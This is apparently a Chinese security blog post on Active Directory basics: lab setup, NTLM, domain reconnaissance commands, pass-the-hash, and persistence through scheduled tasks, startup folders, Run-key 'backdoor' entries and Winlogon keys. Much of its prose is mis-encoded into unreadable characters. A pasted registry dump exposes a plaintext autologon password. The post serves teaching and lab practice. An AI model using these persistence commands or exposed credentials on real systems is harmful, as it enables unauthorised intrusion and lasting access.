ä¸ºåŸŸä¸­çš„è®¡ç®—æœºæ˜¯ä½¿ç”¨DNSæ¥å®šä½åŸŸæ§å’Œå…¶ä»–æœåŠ¡å™¨çš„ï¼Œæ‰€ä»¥åŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ã€‚ï¼ˆDNSå’ŒDCä¸€èˆ¬åœ¨åŒä¸€å°æœºå™¨ä¸Šï¼‰</li></ul><p>å’Œå·¥ä½œç»„çš„åŒºåˆ«ï¼š</p><ul><li>å·¥ä½œç»„ï¼šé»˜è®¤æ¨¡å¼ï¼Œäººäººå¹³ç­‰ï¼Œä¸æ–¹ä¾¿ç®¡ç†  </li><li>åŸŸï¼šäººäººä¸å¹³ç­‰ï¼Œé›†ä¸­ç®¡ç†ï¼Œç»Ÿä¸€ç®¡ç†</li></ul><hr><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>æ­ä¸€ä¸ªç®€å•çš„å•åŸŸç¯å¢ƒï¼š test.moe</p><p>æ­¤å¤„çš„ VMware ç½‘ç»œå‡è®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼</p><h2 id="DC-é…ç½®ï¼ˆWindows-Server-2012ï¼‰"><a href="#DC-é…ç½®ï¼ˆWindows-Server-2012ï¼‰" class="headerlink" title="DC é…ç½®ï¼ˆWindows Server 2012ï¼‰"></a>DC é…ç½®ï¼ˆWindows Server 2012ï¼‰</h2><p>IPï¼š192.168.45.10<br>å­ç½‘æ©ç ï¼š255.255.255.0<br>é»˜è®¤ç½‘å…³ï¼š192.168.45.122<br>DNSï¼š192.168.45.10</p><p>åœ¨æœåŠ¡å™¨ç®¡ç†å™¨ä¸­ä¿®æ”¹ä¸»æœºåä¸º DCï¼Œå¹¶é‡æ–°å¯åŠ¨æœåŠ¡å™¨</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022718565.png"></p><p>æ¥ä¸‹æ¥å®‰è£…åŸŸæ§åˆ¶å™¨ä¸ DNS æœåŠ¡ï¼ŒæœåŠ¡å™¨ç®¡ç†å™¨-ç®¡ç†-æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½</p><p>ä¸‹ä¸€æ­¥ç›´åˆ°é€‰æ‹©æœåŠ¡å™¨è§’è‰²ï¼Œå‹¾é€‰ DNS æœåŠ¡å™¨ï¼Œç„¶åä¸‹ä¸€æ­¥ç›´åˆ°å®‰è£…ï¼Œå»ºè®®å‹¾é€‰â€œå¦‚æœéœ€è¦ï¼Œè‡ªåŠ¨é‡æ–°å¯åŠ¨ç›®æ ‡æœåŠ¡å™¨â€</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022613859.png"></p><p>å®‰è£…å®Œæˆæ—¶ä¼šå‡ºç°â€œå°†æ­¤æœåŠ¡å™¨æå‡ä¸ºåŸŸæ§åˆ¶å™¨â€ï¼Œç‚¹å‡»ï¼Œè¿›å…¥ Active Directory åŸŸæœåŠ¡é…ç½®å‘å¯¼</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022653849.png"></p><p>éƒ¨ç½²é…ç½®-æ·»åŠ æ–°æ—ï¼Œè¾“å…¥åŸŸå test.moe</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022901663.png"></p><p>è¿›å…¥åŸŸæ§åˆ¶å™¨é€‰é¡¹ï¼ŒæŒ‡å®šåŸŸæ§åˆ¶å™¨åŠŸèƒ½ä¸ºâ€œåŸŸåç³»ç»Ÿï¼ˆDNSï¼‰æœåŠ¡å™¨â€å’Œâ€œå…¨å±€ç¼–å½•ï¼ˆGCï¼‰â€ï¼Œå¹¶è®¾ç½®ç›®å½•æœåŠ¡æ¢å¤æ¨¡å¼ï¼ˆDSRMï¼‰çš„å¯†ç </p><blockquote><p>DSRMï¼šå…è®¸ç®¡ç†å‘˜åœ¨åŸŸç¯å¢ƒå‡ºç°æ•…éšœæˆ–å´©æºƒæ—¶è¿˜åŸï¼Œä¿®å¤ï¼Œé‡å»º ADã€‚åœ¨åŸŸæ¸—é€ä¸­ï¼ŒDSRM å¯ä»¥ç”¨äºå¯¹åŸŸç¯å¢ƒè¿›è¡ŒæŒä¹…åŒ–æ“ä½œ</p></blockquote><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022854181.png"></p><p>é»˜è®¤ä¸‹ä¸€æ­¥ï¼Œç›´åˆ°å®‰è£…</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022844765.png"></p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022838530.png"></p><p>é‡æ–°å¯åŠ¨æœåŠ¡å™¨åï¼Œç”¨åŸŸç®¡ç†å‘˜è´¦æˆ· TEST\Administrator ç™»å½•</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022830418.png"></p><p>æ³¨æ„é‡å¯åæœåŠ¡å™¨çš„ DNS ä¼šè¢«è‡ªåŠ¨ä¿®æ”¹ä¸º 127.0.0.1ï¼Œéœ€è¦æ‰‹åŠ¨å°†å…¶ä¿®æ”¹ä¸ºæœ¬æœº IP</p><p>æœ€åï¼Œéœ€è¦åˆ›å»ºåŸŸç”¨æˆ·ï¼Œæ‰“å¼€â€œActive Directory ç”¨æˆ·å’Œè®¡ç®—æœºâ€ï¼ˆå¯ win+r è¾“å…¥ dsa.msc ç›´æ¥æ‰“å¼€ï¼‰</p><p>é€‰ä¸­ Users ç›®å½•å³é”®ï¼Œæ–°å»º-ç”¨æˆ·ï¼Œè®¾ç½®æ–°ç”¨æˆ· Aliceï¼Œå¯†ç æ°¸ä¸è¿‡æœŸï¼Œå¯†ç è®¾ç½®ä¸º c4%@aEWo</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022808904.png"></p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022752315.png"></p><p>ç„¶åå°±åˆ›å»ºæˆåŠŸäº†</p><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20260118022738199.png"></p><hr><h2 id="Web-é…ç½®ï¼ˆWindows-Server-2008ï¼‰"><a href="#Web-é…ç½®ï¼ˆWindows-Server-2008ï¼‰" class="headerlink" title="Web é…ç½®ï¼ˆWindows Server 2008ï¼‰"></a>Web é…ç½®ï¼ˆWindows Server 2008ï¼‰</h2><p>æ¥ä¸‹æ¥å°† Windows Server 2008 ä¸»æœºåŠ å…¥åŸŸ</p><p>IPï¼š192.168.45.20<br>å­ç½‘æ©ç ï¼š255.255.255.0<br>é»˜è®¤ç½‘å…³ï¼š192.168.45.122<br>DNS åœ°å€ï¼šåŸŸæ§çš„ IP 192.168.45.10</p><p>ä¿®æ”¹ä¸»æœºåä¸º WIN2008-WEBï¼Œéš¶å±äºåŸŸï¼ŒåŸŸåä¿®æ”¹ä¸º test.moe</p><p>ç¡®å®šåè¾“å…¥åŸŸç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå³å¯æˆåŠŸåŠ å…¥ test.moe åŸŸ</p><hr><h1 id="Windows-åŸºç¡€"><a href="#Windows-åŸºç¡€" class="headerlink" title="Windows åŸºç¡€"></a>Windows åŸºç¡€</h1><h2 id="SCM"><a href="#SCM" class="headerlink" title="SCM"></a>SCM</h2><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/services/service-control-manager">https://learn.microsoft.com/zh-cn/windows/win32/services/service-control-manager</a></p><p>æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ï¼ˆSCMï¼‰åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨ã€‚ å®ƒæ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æœåŠ¡å™¨ï¼Œä»¥ä¾¿æœåŠ¡é…ç½®å’ŒæœåŠ¡æ§åˆ¶ç¨‹åºå¯ä»¥ä½œè¿œç¨‹è®¡ç®—æœºä¸Šçš„æœåŠ¡ã€‚</p><hr><h2 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h2><p><a href="https://blog.csdn.net/m0_56378124/article/details/118112981">https://blog.csdn.net/m0_56378124/article/details/118112981</a></p><p>securityaccountmanagerï¼Œå®‰å…¨è´¦å·ç®¡ç†å™¨ã€‚Windowsä¸­å¯¹ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨ç®¡ç†ä½¿ç”¨äº† SAM çš„æœºåˆ¶ï¼Œå®‰å…¨è´¦å·ç®¡ç†å™¨å¯¹è´¦å·çš„ç®¡ç†æ˜¯é€šè¿‡å®‰å…¨æ ‡è¯†è¿›è¡Œçš„ï¼Œå®‰å…¨æ ‡è¯†åœ¨è´¦å·åˆ›å»ºæ—¶å°±åŒæ—¶åˆ›å»ºï¼Œä¸€æ—¦è´¦å·è¢«åˆ é™¤ï¼Œå®‰å…¨æ ‡è¯†ä¹ŸåŒæ—¶è¢«åˆ é™¤ã€‚</p><p>ç±»ä¼¼äº unix ç³»ç»Ÿä¸­çš„ passwd æ–‡ä»¶,ä¸è¿‡æ²¡æœ‰ unix çš„ passwd æ–‡ä»¶é‚£ä¹ˆç›´è§‚ï¼Œå½“æˆ‘ä»¬å¿˜è®°å¯†ç çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡åˆ é™¤ SAM æ–‡ä»¶ï¼Œå¿«é€Ÿåœ°è¿›å…¥ç³»ç»Ÿ</p><p>ä½ç½®ï¼š</p><ul><li>C:\WINDOWS\repair\SAM</li><li>C:\WINDOWS\system32\config\SAM</li></ul><hr><h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><p><a href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p><p>NTLMæ˜¯ NT LAN Manager çš„ç¼©å†™ï¼ŒNTLM æ˜¯åŸºäºæŒ‘æˆ˜&#x2F;åº”ç­”çš„èº«ä»½éªŒè¯åè®®ï¼Œæ˜¯ Windows NT æ—©æœŸç‰ˆæœ¬ä¸­çš„æ ‡å‡†å®‰å…¨åè®®ã€‚</p><p>æµç¨‹ï¼š</p><ul><li>å®¢æˆ·ç«¯åœ¨æœ¬åœ°åŠ å¯†å½“å‰ç”¨æˆ·çš„å¯†ç æˆä¸ºå¯†ç æ•£åˆ—</li><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨æ˜æ–‡å‘é€è´¦å·</li><li>æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ª16ä½çš„éšæœºæ•°å­—å‘é€ç»™å®¢æˆ·ç«¯ï¼Œä½œä¸ºä¸€ä¸ªchallenge</li><li>å®¢æˆ·ç«¯ç”¨åŠ å¯†åçš„å¯†ç æ•£åˆ—æ¥åŠ å¯†challengeï¼Œç„¶åè¿”å›ç»™æœåŠ¡å™¨ï¼Œä½œä¸ºresponse</li><li>æœåŠ¡å™¨ç«¯å°†ç”¨æˆ·åã€challengeã€responseå‘é€ç»™åŸŸæ§åˆ¶å™¨</li><li>åŸŸæ§åˆ¶å™¨ç”¨è¿™ä¸ªç”¨æˆ·ååœ¨SAMå¯†ç ç®¡ç†åº“ä¸­æ‰¾åˆ°è¿™ä¸ªç”¨æˆ·çš„å¯†ç æ•£åˆ—ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå¯†ç æ•£åˆ—æ¥åŠ å¯†chellenge</li><li>åŸŸæ§åˆ¶å™¨æ¯”è¾ƒä¸¤æ¬¡åŠ å¯†çš„challengeï¼Œå¦‚æœä¸€æ ·é‚£ä¹ˆè®¤è¯æˆåŠŸï¼Œåä¹‹è®¤è¯å¤±è´¥</li></ul><hr><h2 id="åŸŸç›¸å…³å‘½ä»¤"><a href="#åŸŸç›¸å…³å‘½ä»¤" class="headerlink" title="åŸŸç›¸å…³å‘½ä»¤"></a>åŸŸç›¸å…³å‘½ä»¤</h2><p><a href="https://www.cnblogs.com/05-hust/articles/12307385.html">https://www.cnblogs.com/05-hust/articles/12307385.html</a></p><p><a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/">https://learn.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/</a></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user <span class="token operator">/</span>domain<span class="token comment"># æŸ¥çœ‹å½“å‰åŸŸä¸­çš„ç”¨æˆ·</span>net <span class="token function">group</span><span class="token comment"># åˆ—å‡ºæœ¬åœ°æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰ç»„ï¼ŒåŸŸç¯å¢ƒä¸‹åªèƒ½ç”¨äºåŸŸæ§</span>net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain<span class="token comment"># åˆ—å‡ºåŸŸå†…ç®¡ç†å‘˜ç»„çš„ç”¨æˆ·</span>net use<span class="token comment"># æŸ¥çœ‹è‡ªèº«å½“å‰ä¸ç½‘ç»œèµ„æºçš„è¿æ¥ï¼Œä¾‹å¦‚é©±åŠ¨å™¨æ˜ å°„ã€IPCè¿æ¥</span>net use e: \\financial\letters<span class="token comment"># å°†Eç›˜åˆ†é…ç»™financialæœåŠ¡å™¨ä¸Šçš„letterså…±äº«ç›®å½•</span>net use d:\\server\share <span class="token operator">/</span>user:Accounts\User1<span class="token comment"># è¿æ¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="åæ¸—é€ä¿¡æ¯æ”¶é›†"><a href="#åæ¸—é€ä¿¡æ¯æ”¶é›†" class="headerlink" title="åæ¸—é€ä¿¡æ¯æ”¶é›†"></a>åæ¸—é€ä¿¡æ¯æ”¶é›†</h1><h2 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">whoami <span class="token operator">/</span>allipconfig <span class="token operator">/</span>allroute printsysteminfonetstat <span class="token operator">-</span>anonet sessionnet sharenet usetasklistwmic service get Caption<span class="token punctuation">,</span> Name<span class="token punctuation">,</span> PathName<span class="token punctuation">,</span> StartName<span class="token punctuation">,</span> Stateschtasks <span class="token operator">/</span>query <span class="token operator">/</span>v <span class="token operator">/</span>fo listwmic startup get Caption<span class="token punctuation">,</span> Command<span class="token punctuation">,</span> Location<span class="token punctuation">,</span> Userwmic qfe get Caption<span class="token punctuation">,</span> CSName<span class="token punctuation">,</span> Description<span class="token punctuation">,</span> HotFixID<span class="token punctuation">,</span> InstalledOnwmic product get Caption<span class="token punctuation">,</span> Verionnet usernet localgroupquery user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="åŸŸä¿¡æ¯æ”¶é›†"><a href="#åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸä¿¡æ¯æ”¶é›†"></a>åŸŸä¿¡æ¯æ”¶é›†</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net config workstationnet user <span class="token operator">/</span>domainnet <span class="token function">group</span> <span class="token operator">/</span>domainnet accounts <span class="token operator">/</span>domain<span class="token comment"># æŸ¥çœ‹åŸŸå†…å¯†ç ç­–ç•¥</span>net <span class="token function">group</span> <span class="token string">"Domain Controllers"</span> <span class="token operator">/</span>domain<span class="token comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨åˆ—è¡¨</span>net time <span class="token operator">/</span>domain<span class="token comment"># æŸ¥çœ‹ä¸»åŸŸæ§åˆ¶å™¨</span>ping DC<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>com<span class="token comment"># å®šä½åŸŸæ§åˆ¶å™¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><h2 id="å“ˆå¸Œä¼ é€’ï¼ˆPass-The-Hashï¼‰"><a href="#å“ˆå¸Œä¼ é€’ï¼ˆPass-The-Hashï¼‰" class="headerlink" title="å“ˆå¸Œä¼ é€’ï¼ˆPass The Hashï¼‰"></a>å“ˆå¸Œä¼ é€’ï¼ˆPass The Hashï¼‰</h2><p><a href="https://zhuanlan.zhihu.com/p/472019671">https://zhuanlan.zhihu.com/p/472019671</a></p><p>åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ä¸€èˆ¬ä½¿ç”¨åŸŸè´¦å·ï¼Œå¤§é‡è®¡ç®—æœºåœ¨å®‰è£…æ—¶ä¼šä½¿ç”¨ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå› æ­¤ï¼Œå¦‚æœè®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ä¹Ÿç›¸åŒï¼Œæ”»å‡»è€…å°±èƒ½ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»çš„æ–¹æ³•æ¥ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–ä¸»æœºã€‚</p><p>æ³¨æ„ï¼Œæ­¤å¤„ä¼ é€’çš„ä¸æ˜¯æ˜æ–‡å¯†ç ï¼Œå› ä¸ºæ˜æ–‡ç›¸åŒï¼Œæ‰€ä»¥å…¶ session hash éƒ½æ˜¯å›ºå®šçš„ï¼ˆé™¤éå¯†ç è¢«ä¿®æ”¹å¹¶åˆ·æ–°ç¼“å­˜ï¼‰ï¼Œåˆ™æ— éœ€è§£å¯† hash å€¼ï¼Œç›´æ¥ä¼ é€’è¿™ä¸ª hash è¿›è¡Œèº«ä»½éªŒè¯å³å¯</p><p>åœ¨ Windows ä¸­ï¼Œpth é€šè¿‡ NT Lan Manager(NTLM)ï¼ŒKereros å’Œå…¶ä»–èº«ä»½éªŒè¯åè®®æ¥è¿›è¡Œå•ç‚¹ç™»å½•ã€‚åœ¨ Windows ä¸­åˆ›å»ºå¯†ç åï¼Œå¯†ç ç»è¿‡å“ˆå¸ŒåŒ–å¤„ç†åå­˜å‚¨åœ¨å®‰å…¨è´¦æˆ·ç®¡ç†å™¨(SAM)ï¼Œæœ¬åœ°å®‰å…¨æœºæ„å­ç³»ç»Ÿ(LSASS)è¿›ç¨‹å†…å­˜ï¼Œå‡­æ®ç®¡ç†å™¨(CredMan)ï¼ŒActive Directory ä¸­çš„ ntds.dit æ•°æ®åº“æˆ–è€…å…¶ä»–åœ°æ–¹ã€‚å› æ­¤ï¼Œå½“ç”¨æˆ·ç™»å½• Windows å·¥ä½œç«™æˆ–æœåŠ¡å™¨æ—¶ï¼Œä»–ä»¬å®é™…ä¸Šä¼šç•™ä¸‹å¯†ç å‡­æ®(hash)ã€‚</p><p>å·¥å…·ï¼šmimikatzã€impacket</p><hr><h1 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h1><p><a href="https://blog.csdn.net/weixin_44268918/article/details/132338391">https://blog.csdn.net/weixin_44268918/article/details/132338391</a></p><h2 id="ç³»ç»Ÿåé—¨"><a href="#ç³»ç»Ÿåé—¨" class="headerlink" title="ç³»ç»Ÿåé—¨"></a>ç³»ç»Ÿåé—¨</h2><h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">åˆ›å»ºä»»åŠ¡ï¼šSchtasks <span class="token operator">/</span>Create <span class="token operator">/</span>TN TestService <span class="token operator">/</span><span class="token function">SC</span> DAILY <span class="token operator">/</span>ST 09:46 <span class="token operator">/</span>TR c:\1\3000<span class="token punctuation">.</span>exe <span class="token operator">/</span>RL HIGHEST  æŸ¥çœ‹ä»»åŠ¡ï¼šSchTasks <span class="token operator">/</span>Query <span class="token operator">/</span>v <span class="token operator">/</span>fo liståˆ é™¤ä»»åŠ¡ï¼šSchTasks <span class="token operator">/</span>Delete <span class="token operator">/</span>TN TestService <span class="token punctuation">[</span><span class="token operator">/</span>f<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä»¥ SYSTEM æƒé™è¿è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œå°±éœ€è¦æ‹¥æœ‰ç®¡ç†å‘˜çº§åˆ«çš„æƒé™ï¼Œä½æƒé™ç”¨æˆ·çœ‹ä¸åˆ°é«˜æƒé™ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡</p><h3 id="è‡ªå¯åŠ¨ç›¸å…³çš„å¯åŠ¨é¡¹-x2F-æ³¨å†Œè¡¨é”®"><a href="#è‡ªå¯åŠ¨ç›¸å…³çš„å¯åŠ¨é¡¹-x2F-æ³¨å†Œè¡¨é”®" class="headerlink" title="è‡ªå¯åŠ¨ç›¸å…³çš„å¯åŠ¨é¡¹&#x2F;æ³¨å†Œè¡¨é”®"></a>è‡ªå¯åŠ¨ç›¸å…³çš„å¯åŠ¨é¡¹&#x2F;æ³¨å†Œè¡¨é”®</h3><h4 id="ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹"><a href="#ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹" class="headerlink" title="ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹"></a>ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹</h4><p>å°†ç¨‹åºæ”¾ç½®åœ¨å¯åŠ¨æ–‡ä»¶å¤¹ä¸­ä¼šå¯¼è‡´è¯¥ç¨‹åºåœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œï¼Œä½ç½®ä¸€èˆ¬å¦‚ä¸‹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\<span class="token function">Start</span> Menu\Programs\StartupC:\Users\Administrator\AppData\Roaming\Microsoft\Windows\å¼€å§‹èœå•\ç¨‹åº\å¯åŠ¨C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\<span class="token function">Start</span><span class="token comment"># æŒ‡å®šç”¨æˆ·èŒƒå›´å¯åŠ¨</span>C:\ProgramData\Microsoft\Windows\<span class="token function">Start</span> Menu\Programs\StartUp<span class="token comment"># ç³»ç»ŸèŒƒå›´å¯åŠ¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¿è¡Œé”®"><a href="#è¿è¡Œé”®" class="headerlink" title="è¿è¡Œé”®"></a>è¿è¡Œé”®</h4><p>éœ€è¦ç®¡ç†å‘˜çº§åˆ«çš„æƒé™</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># å½“å‰ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨</span>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<span class="token comment"># æ‰€æœ‰ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨</span>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">REG ADD <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> <span class="token operator">/</span>V <span class="token string">"backdoor"</span> <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>D <span class="token string">"C:\1\3000.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Winlogon-Helper"><a href="#Winlogon-Helper" class="headerlink" title="Winlogon Helper"></a>Winlogon Helper</h4><p>Winlogon æ˜¯ Windows ç³»ç»Ÿçš„ç»„ä»¶ï¼Œç”¨äºå¤„ç†ä¸ç”¨æˆ·æœ‰å…³çš„å„ç§è¡Œä¸ºï¼Œå¦‚ç™»å½•ã€æ³¨é”€ã€åœ¨ç™»å½•æ—¶åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ã€é”å®šå±å¹•ç­‰ã€‚ä¸€äº›é”®å€¼å®šä¹‰äº†åœ¨ Windows ç™»å½•æœŸé—´ä¼šå¯åŠ¨å“ªäº›è¿›ç¨‹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg query <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon    AutoRestartShell    REG_DWORD    0x1    Background    REG_SZ    0 0 0    CachedLogonsCount    REG_SZ    10    DebugServerCommand    REG_SZ    no    DisableBackButton    REG_DWORD    0x1    EnableSIHostIntegration    REG_DWORD    0x1    ForceUnlockLogon    REG_DWORD    0x0    LegalNoticeCaption    REG_SZ    LegalNoticeText    REG_SZ    PasswordExpiryWarning    REG_DWORD    0x5    PowerdownAfterShutdown    REG_SZ    0    PreCreateKnownFolders    REG_SZ    <span class="token punctuation">&#123;</span>A520A1A4-1780-4FF6-BD18-167343C5AF16<span class="token punctuation">&#125;</span>    ReportBootOk    REG_SZ    1    Shell    REG_SZ    explorer<span class="token punctuation">.</span>exe    ShellCritical    REG_DWORD    0x0    ShellInfrastructure    REG_SZ    sihost<span class="token punctuation">.</span>exe    SiHostCritical    REG_DWORD    0x0    SiHostReadyTimeOut    REG_DWORD    0x0    SiHostRestartCountLimit    REG_DWORD    0x0    SiHostRestartTimeGap    REG_DWORD    0x0    Userinit    REG_SZ    C:\Windows\system32\userinit<span class="token punctuation">.</span>exe<span class="token punctuation">,</span>    VMApplet    REG_SZ    SystemPropertiesPerformance<span class="token punctuation">.</span>exe <span class="token operator">/</span>pagefile    WinStationsDisabled    REG_SZ    0    ShellAppRuntime    REG_SZ    ShellAppRuntime<span class="token punctuation">.</span>exe    scremoveoption    REG_SZ    0    DisableCAD    REG_DWORD    0x1    LastLogOffEndTimePerfCounter    REG_QWORD    0x27d2ca15cd    ShutdownFlags    REG_DWORD    0x80000027    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180    LastUsedUsername    REG_SZ    yuxuan    AutoAdminLogon    REG_SZ    1    DefaultUserName    REG_SZ    yuxuan    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L    DefaultDomainName    REG_SZ    xiaorang<span class="token punctuation">.</span>labHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShellsHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensionsHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaultsHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ShellHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 